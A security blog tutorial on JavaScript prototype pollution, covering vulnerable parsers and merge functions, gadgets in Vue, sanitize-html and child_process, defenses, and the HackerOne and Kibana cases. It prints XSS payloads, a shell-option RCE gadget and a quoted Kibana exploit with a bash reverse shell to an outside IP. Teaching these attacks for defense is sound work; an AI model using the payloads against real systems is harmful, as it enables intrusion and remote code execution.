---
title: "Prototype Pollution: An Attack Technique Based on JS Prototype Chain"
date: 2021-09-29
tags: [Security, Front-end]
categories: [Security]
photos: /img/prototype-pollution/cover-en.png
---

## Introduction

<!-- summary -->
As a front-end engineer or someone who knows JavaScript, you must have heard of the term "prototype" and may even have encountered related questions during interviews. 

However, you may not have heard of a type of attack technique closely related to the prototype chain in JavaScript, which utilizes the characteristics of the prototype chain to carry out attacks - Prototype Pollution. This is an interesting and powerful attack technique.
<!-- summary -->

<!-- more -->


## Prototype Chain

Object-oriented programming in JavaScript is different from other programming languages. The `class` you see now is a syntax introduced after ES6. Before that, `prototype` was used to achieve the same purpose, also known as prototype inheritance.

For example, have you ever wondered where the built-in functions come from when you use them?

``` js
var str = "a"
var str2 = str.repeat(5) // Where does the "repeat" come from?
```

You may even find that the `repeat` method of two different strings is actually the same function:

``` js
var str = "a"
var str2 = "b"
console.log(str.repeat === str2.repeat) // true
```

Or if you have ever checked MDN, you will find that the title is not "repeat", but `String.prototype.repeat`:

![string.prototype.repeat](/img/prototype-pollution/1-repeat.png)

And all of this is related to the prototype.

When you call `str.repeat`, there is not really a method called `repeat` on the `str` instance. Then how does the JS engine work?

Do you remember the concept of scope? If I use a variable and it cannot be found in the local scope, the JS engine will go to the upper scope to find it, and then keep going up the scope chain until it reaches the global scope. This is also called the scope chain. The JS engine continuously searches along this chain until it stops at the top.

The concept of the prototype chain is exactly the same, but the difference is: "How does the JS engine know where the upper layer is?" If the JS engine cannot find the `repeat` function on `str`, where should it look?

In JS, there is a hidden property called `__proto__`, and the value it stores is where the JS engine should look up. 

For example:

``` js
var str = ""
console.log(str.__proto__) // String.prototype
```

What `str.__proto__` points to is the "upper layer" where the JS engine should go when it cannot find anything on `str`. This upper layer will be `String.prototype`.

This explains why MDN does not write `repeat`, but writes `String.prototype.repeat`, because this is the full name of the `repeat` function. This `repeat` function is actually a method on the `String.prototype` object.

Therefore, when you call `str.repeat`, you are actually calling `String.prototype.repeat`, and this is the principle and operation mode of the prototype chain.

Other things are the same as strings, such as objects:

``` js
var obj = {}
console.log(obj.a) // undefined
console.log(obj.toString) // ƒ toString() { [native code] }
```

Although `obj` is an empty object, why does `obj.toString` exist? Because the JS engine cannot find it on `obj`, it goes to `obj.__proto__` to find it, and `obj.__proto__` points to `Object.prototype`. Therefore, what `obj.toString` finally finds is actually `Object.prototype.toString`.

``` js
var obj = {}
console.log(obj.toString === Object.prototype.toString) // true
```

## Changing Properties on the Default Prototype

The `__proto__` of a string is `String.prototype`, the `__proto__` of a number is `Number.prototype`, and the `__proto__` of an array is `Array.prototype`. These associations are already pre-set to allow these class objects to share the same function.

If each string has its own `repeat`, then there will be one million different repeats for one million strings, but they actually do the same thing, which doesn't sound reasonable, right? Therefore, through the prototype, we can put `repeat` in `String.prototype`, so that every string that uses this function will call the same function.

You may wonder, since the same function is called with the same parameters, how can the function distinguish which string is calling it?

The answer is: this, let's take an example below:

``` js
String.prototype.first = function() {
  return this[0]
}

console.log("".first()) // undefined
console.log("abc".first()) // a
```

First, I added a method called `first` on `String.prototype`, so when I call `"".first`, the JS engine finds `String.prototype` along `__proto__`, finds that `String.prototype.first` exists, and calls this function.

And because of the rules of this, when `"".first()` is written, the this obtained in `first` will be `""`; if `"abc".first()` is called, the this obtained in `first` will be `"abc"`, so we can use this to distinguish who is calling now.

The way `String.prototype.first` is written above is to directly modify the prototype of String, add a new method, and let all strings use this new method. Although it is very convenient, this method is not recommended in development. There is a saying: [Don't modify objects you don't own](https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/). For example, MooTools did something similar, which caused an array method to be renamed. For details, please see what I wrote before: [Don’t break the Web: SmooshGate and <keygen>](https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/).

Then, since `String.prototype` can be modified, it is natural that `Object.prototype` can also be modified, like this:

``` js
Object.prototype.a = 123
var obj = {}
console.log(obj.a) // 123
```

Because `Object.prototype` is modified, when accessing `obj.a`, the JS engine cannot find the property a on obj, so it goes to `obj.__proto__`, which is `Object.prototype`, finds a on it, and returns the value of a.

When the program has vulnerabilities that can be used by attackers to change properties on the prototype chain, it is called prototype pollution. Pollution means pollution. Like the example of the object above, we "polluted" the property `a` on the object prototype through `Object.prototype.a = 123`, causing unexpected behavior when accessing the object.

What are the consequences of this?

## What can be done after polluting properties?

Suppose there is a search function on the website that will take the value of `q` from the query string, and write it to the screen, as shown below:

![search](/img/prototype-pollution/2-search.png)

And the entire code is written like this:

``` js
// 從網址列上拿到 query string
var qs = new URLSearchParams(location.search.slice(1))

// 放上畫面，為了避免 XSS 用 innerText
document.body.appendChild(createElement({
  tag: 'h2',
  innerText: `Search result for ${qs.get('q')}`
}))

// 簡化建立元件用的函式
function createElement(config){
  const element = document.createElement(config.tag)
  if (config.innerHTML) {
    element.innerHTML = config.innerHTML
  } else {
    element.innerText = config.innerText
  }
  return element
}
```

There should be no problem with the above code, right? We wrote a function `createElement` to simplify some steps for us, and decided what components to generate based on the config passed in. In order to avoid XSS, we use `innerText` instead of `innerHTML`, which is foolproof and absolutely no XSS!

It looks like this, but if there is a prototype pollution vulnerability before executing this code, which allows attackers to pollute properties on the prototype, what will happen? For example, like this:

``` js
// 先假設可以污染原型上的屬性
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'

// 底下都跟剛剛一樣
var qs = new URLSearchParams(location.search.slice(1))

document.body.appendChild(createElement({
  tag: 'h2',
  innerText: `Search result for ${qs.get('q')}`
}))

function createElement(config){
  const element = document.createElement(config.tag)
  // 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true
  if (config.innerHTML) {
    element.innerHTML = config.innerHTML
  } else {
    element.innerText = config.innerText
  }
  return element
}
```

The entire code only differs in the beginning, with an additional `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'`, and just because this line polluted innerHTML, the judgment of `if (config.innerHTML) {` below becomes true, the behavior is changed, and it was originally `innerText`, now it is changed to `innerHTML`, and finally XSS is achieved!

This is an XSS attack caused by prototype pollution. Generally speaking, prototype pollution refers to vulnerabilities in the program that allow attackers to contaminate properties on the prototype chain. However, in addition to contamination, it is also necessary to find places that can be affected in order to form a complete attack.

At this point, you may be curious about what kind of code has vulnerabilities that allow attackers to modify properties on the prototype chain.

## How does prototype pollution occur?

There are two common examples of this happening. The first is parsing the query string.

You might think that the query string is just the type `?a=1&b=2`, what's so difficult about it? But in fact, many query string libraries support arrays, such as `?a=1&a=2` or `?a[]=1&a[]=2`, which can be parsed as arrays.

In addition to arrays, some even support objects, like this: `?a[b][c]=1`, which will produce an object `{a: {b: {c: 1}}}`.

For example, the [qs](https://github.com/ljharb/qs#parsing-objects) library supports object parsing.

If you were responsible for this feature today, how would you write it? We can write a simple version that only targets objects (without considering URL encoding or arrays):

``` js
function parseQs(qs) {
  let result = {}
  let arr = qs.split('&')
  for(let item of arr) {
    let [key, value] = item.split('=')
    if (!key.endsWith(']')) {
      // 針對一般的 key=value
      result[key] = value
      continue
    }

    // 針對物件
    let items = key.split('[')
    let obj = result
    for(let i = 0; i < items.length; i++) {
      let objKey = items[i].replace(/]$/g, '')
      if (i === items.length - 1) {
        obj[objKey] = value
      } else {
        if (typeof obj[objKey] !== 'object') {
          obj[objKey] = {}
        }
        obj = obj[objKey]
      }
    }
  }
  return result
}

var qs = parseQs('test=1&a[b][c]=2')
console.log(qs)
// { test: '1', a: { b: { c: '2' } } }
```

Basically, it constructs an object based on the content inside `[]`, and assigns values layer by layer, which doesn't look particularly special.

But! If my query string looks like this, things are different:

``` js
var qs = parseQs('__proto__[a]=3')
console.log(qs) // {}

var obj = {}
console.log(obj.a) // 3
```

When my query string is like this, `parseQs` will go and change the value of `obj.__proto__.a`, causing prototype pollution, which causes me to declare an empty object and print out `obj.a` later, but it prints out 3 because the object prototype has been contaminated.

Many libraries that parse query strings have had similar issues, and below are a few examples:

1. [jquery-deparam](https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651)
2. [backbone-query-parameters](https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381)
3. [jquery-query-object](https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650)

In addition to parsing query strings, another feature that often causes this problem is merging objects. A simple merge object function looks like this:

``` js
function merge(a, b) {
  for(let prop in b) {
    if (typeof a[prop] === 'object') {
      merge(a[prop], b[prop])
    } else {
      a[prop] = b[prop]
    }
  } 
}

var config = {
  a: 1,
  b: {
    c: 2
  }
}

var customConfig = {
  b: {
    d: 3
  }
}

merge(config, customConfig)
console.log(config)
// { a: 1, b: { c: 2, d: 3 } }
```

If the `customConfig` above is controllable, then there will be a problem:

``` js
var config = {
  a: 1,
  b: {
    c: 2
  }
}

var customConfig = JSON.parse('{"__proto__": {"a": 1}}')
merge(config, customConfig)

var obj = {}
console.log(obj.a)
```

The reason why `JSON.parse` is used here is that if you write it directly like this:

``` js
var customConfig = {
  __proto__: {
    a: 1
  }
}
```

it won't work, `customConfig` will only be an empty object. You need to use `JSON.parse` to create an object with a key of `__proto__`:

``` js
var obj1 = {
  __proto__: {
    a: 1
  }
}
var obj2 = JSON.parse('{"__proto__": {"a": 1}}')
console.log(obj1) // {}
console.log(obj2) // { __proto__: { a: 1 } }
```

Similarly, many merge-related libraries have had this vulnerability, such as:

1. [merge](https://snyk.io/vuln/SNYK-JS-MERGE-1040469)
2. [lodash.merge](https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733)
3. [plain-object-merge ](https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643)

In addition to these, basically any library that operates on objects has had similar problems, such as:

1. [immer](https://snyk.io/vuln/SNYK-JS-IMMER-1019369)
2. [mootools](https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536)
3. [ioredis](https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196)

Now that we know where prototype pollution problems are likely to occur, it is not enough to just contaminate properties on the prototype. We also need to find places that can be affected, that is, which places will change behavior after the properties are contaminated, so that we can execute the attack.

## Prototype pollution script gadgets

These "code that can be exploited as long as we pollute the prototype" are called script gadgets. There is a GitHub repo that collects these gadgets: [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution). Some gadgets may be unimaginable, let me demonstrate ([demo webpage](https://aszx87410.github.io/demo/prototype-pollution/vue.html)):

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <script src="https://unpkg.com/vue/dist/vue.js"></script>
</head>
<body>
  <div id="app">
    {{ message }}
  </div>
  <script>
    // 污染 template
    Object.prototype.template = '<svg onload=alert(1)></svg>';
    var app = new Vue({ 
      el: '#app',
      data: {
        message: 'Hello Vue!'
      }
    });
  </script>
</body>
</html>
```

A seemingly harmless Vue hello world, after we pollute `Object.prototype.template`, becomes an XSS that allows us to insert any code.

Or like this ([demo webpage](https://aszx87410.github.io/demo/prototype-pollution/vue.html)):

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
</head>
<body>
  <script>
    Object.prototype.innerText = '<svg onload=alert(1)></svg>';
    document.write(sanitizeHtml('<div>hello</div>'))
  </script>
</body>
</html>
```

Although it is a library for sanitizing, after polluting `Object.prototype.innerText`, it becomes a good helper for XSS.

Why do these problems occur? Taking `sanitize-html` as an example, it is because of this piece of code:

``` js
if (frame.innerText && !hasText && !options.textFilter) {
    result += frame.innerText;
}
```

Because innerText is directly assumed to be a safe string by default, it is directly concatenated. After we pollute this property, when this property does not exist, the value of the prototype will be used, and finally it becomes an XSS.

In addition to client-side, server-side Node.js also has similar risks, such as:

``` js
const child_process = require('child_process')
const params = ['123']
const result = child_process.spawnSync(
  'echo', params
);
console.log(result.stdout.toString()) // 123
```

This is a very simple code that executes the `echo` command and passes in parameters. This parameter will be automatically processed for you, so you don't have to worry about command injection issues:

``` js
const child_process = require('child_process')
const params = ['123 && ls']
const result = child_process.spawnSync(
  'echo', params
);
console.log(result.stdout.toString()) // 123 && ls
```

But if there is a prototype pollution vulnerability, it can be transformed into RCE (Remote code execution) with a slight change, allowing attackers to execute any command (assuming the attacker can control params):

``` js
const child_process = require('child_process')
const params = ['123 && ls']
Object.prototype.shell = true // 只多了這行，參數的解析就會不一樣
const result = child_process.spawnSync(
  'echo', params, {timeout: 1000}
);
console.log(result.stdout.toString())
/*
123
index.js
node_modules
package-lock.json
package.json
*/
```

The reason for this is that there is an option called `shell` in the third parameter options of `child_process.spawn`. Setting it to true will cause different behavior, and the official [documentation](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) also states:

> If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.

By combining prototype pollution with script gadgets (`child_process.spawn`), a highly critical vulnerability has been successfully created.

## Summary

If there is a function in the program that allows attackers to pollute properties on the prototype, this vulnerability is called prototype pollution. Prototype pollution itself is not very useful and needs to be combined with other code to be effective. The code that can be combined with it is called script gadget.

For example, Vue's internal implementation will render the corresponding content based on the `template` property of an object, so as long as we pollute `Object.prototype.template`, we can create an XSS vulnerability. Or `child_process.spawn` uses `shell`, so after polluting it, it becomes an RCE vulnerability.

What needs to be fixed is not the usable script gadgets, unless you change every place where the object is accessed, but this is not a fundamental solution. The real solution is to eliminate prototype pollution so that the prototype cannot be polluted, and there will be no such problems.

## How to defend

On any prototype pollution vulnerability page on [snyk](https://snyk.io/vuln/SNYK-JS-SWIPER-1088062), there are defense suggestions, which can also be found in this article: [Prototype pollution attack in NodeJS application](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf).

There are several common defense methods. The first is to prevent the `__proto__` key when performing operations on these objects. For example, the query string parsing and merge object mentioned earlier can use this method.

However, in addition to `__proto__`, another bypass method should also be noted, like this:

``` js
var obj = {}
obj['constructor']['prototype']['a'] = 1
var obj2 = {}
console.log(obj2.a) // 1
```

Using `constructor.prototype` can also pollute the properties on the prototype chain, so these methods should be blocked together to be safe.

For example, the prototype pollution of [lodash.merge](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad) is fixed using this method. Special processing is done when the key is `__proto__` or `prototype`.

The second method is simple and easy to understand, which is to not use objects, or more precisely, "do not use objects with prototypes".

Some people may have seen a way to create objects like this: `Object.create(null)`. This creates an empty object without the `__proto__` property, which is a truly empty object with no methods. Because of this, there will be no prototype pollution problems:

``` js
var obj = Object.create(null)
obj['__proto__']['a'] = 1 // 根本沒有 __proto__ 這個屬性
// TypeError: Cannot set property 'a' of undefined
```

Like the query string parsing library mentioned at the beginning, this method has been used to defend against prototype pollution. For example, [query-string](https://www.npmjs.com/package/query-string), which is downloaded up to 10 million times a week, has the following statement in its [documentation](https://github.com/sindresorhus/query-string#parsestring-options):

> .parse(string, options?)
> Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.
>  
> The returned object is created with Object.create(null) and thus does not have a prototype.

Other suggestions include using `Map` instead of `{}`, but I think most people are still used to using objects, and I personally think `Object.create(null)` is a bit better than Map.

Or use `Object.freeze(Object.prototype)` to freeze the prototype so that it cannot be modified:

``` js
Object.freeze(Object.prototype)
var obj = {}
obj['__proto__']['a'] = 1
var obj2 = {}
console.log(obj2.a) // undefined
```

However, one problem with `Object.freeze(Object.prototype)` is that if a third-party package modifies `Object.prototype`, such as adding a property directly to it for convenience, it will be difficult to debug because modifying it after freezing will not cause an error, it just won't be modified successfully.

So you may find that your program is broken because of a third-party package, but you don't know why. Another possible risk I can think of is polyfill. If in the future, a polyfill is needed to be added to `Object.prototype` due to version issues, it will be invalidated due to the freeze.

As for Node.js, you can also use the `--disable-proto` option to turn off `Object.prototype.__proto__`. For details, please refer to the [official documentation](https://nodejs.org/api/cli.html#cli_disable_proto_mode).

In the future, document policy may also be used for processing. You can follow this issue: [Feature proposal: Mitigation for Client-Side Prototype Pollution](https://github.com/WICG/document-policy/issues/33).

## Real-world examples

Finally, let's take a look at two real-world examples of prototype pollution to give you a better sense of it.

The first example is a vulnerability in the well-known bug bounty platform, HackerOne (yes, it's a vulnerability in the platform itself). The full report can be found here: [#986386 Reflected XSS on www.hackerone.com via Wistia embed code](https://hackerone.com/reports/986386)

On their website, they used a third-party library that contained the following code:

``` js
i._initializers.initWLog = function() {
    var e, t, n, o, a, l, s, d, u, p, c;
    if (t = i.url.parse(location.href),
    document.referrer && (u = i.url.parse(document.referrer)),
```

It parses `location.href` and `document.referrer`, both of which are controllable by attackers, and the `i.url.parse` function has a prototype pollution vulnerability, allowing for arbitrary property pollution.

After pollution, the author discovered another piece of code that is similar to the `createElement` we wrote earlier. `fromObject` traverses properties and puts them on the DOM:

``` js
if (this.chrome = r.elem.fromObject({
    id: r.seqId('wistia_chrome_'),
    class: 'w-chrome',
    style: r.generate.relativeBlockCss(),
    tabindex: -1
})
```

Therefore, by polluting `innerHTML`, an attacker can use this script gadget to create an XSS vulnerability. The actual attack method is to construct a URL that can trigger prototype pollution + XSS. Simply pass the URL to someone else, and when they click on it, they will be directly attacked.

The second example is a vulnerability in Kibana, and the original article can be found here: [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/). The official description of this vulnerability is as follows:

> An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.

In Kibana, there is a Timelion feature that allows users to enter syntax and draw charts. The following syntax can pollute the prototype:

``` js
.es.props(label.__proto__.x='ABC')
```

Polluting the prototype is just the first step. The next step is to find a script gadget. One of the Kibana scripts looks like this:

``` js
  var env = options.env || process.env;
  var envPairs = [];

  for (var key in env) {
    const value = env[key];
    if (value !== undefined) {
      envPairs.push(`${key}=${value}`);
    }
  }
```

This script will construct an environment variable that will be used to run a new node process. For example, if envPairs is `a=1`, it should run the command `a=1 node xxx.js`.

Since it runs node.js, we can secretly introduce a file using the `NODE_OPTIONS` environment variable:

``` js
// a.js
console.log('a.js')

// b.js
console.log('b.js')

// 跑這個指令，用環境變數引入 a.js
NODE_OPTIONS="--require ./a.js" node b.js

// 輸出
a.js
b.js
```

Therefore, if we can upload a js file, we can use prototype pollution to execute this file. It sounds a bit complicated. Is there another way?

Yes! A common technique is to control the content of some files, such as the PHP session content, which can be controlled, as described in this article: [Triggering RCE by introducing PHP session files through LFI](https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce). Another file in Linux systems, `/proc/self/environ`, contains all the environment variables of the current process. 

If we create an environment variable called `A=console.log(123)//`, the contents of `/proc/self/environ` will change:

``` js
A=console.log(123)//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....
```

becomes valid JS code!

So you can execute it like this:

``` js
NODE_OPTIONS="--require /proc/self/environ" A='console.log(1)//' node b.js
```

The code provided by the author looks like this:

``` js
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

It pollutes two different properties, creates two environment variables, one to turn `/proc/self/environ` into valid JS and includes the code to execute, and the other `NODE_OPTIONS` uses `--require` to import `/proc/self/environ`, finally creating an RCE vulnerability that can execute any code!

## Conclusion

Before I got into cybersecurity, I had never heard of prototype pollution.

So when I first encountered the prototype pollution vulnerability, I was a bit surprised. What surprised me was why I had never heard of it before? Compared to common vulnerabilities in front-end development such as XSS or CSRF, the notoriety of prototype pollution seems to be much lower.

Some people may have first heard of this term because a certain NPM package had this vulnerability, which was fixed after upgrading to a new version, but they may not have understood the cause of the vulnerability and its potential impact.

I actually quite like this vulnerability, first because I think the cause is interesting, and second because I think finding script gadgets is also interesting. In any case, I hope that through this article, more front-end engineers can become aware of this vulnerability and understand its principles and defense methods.

Finally, I recommend a great article that automatically detects prototype pollution vulnerabilities and identifies problem areas, which I think takes prototype pollution to another level: [A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)
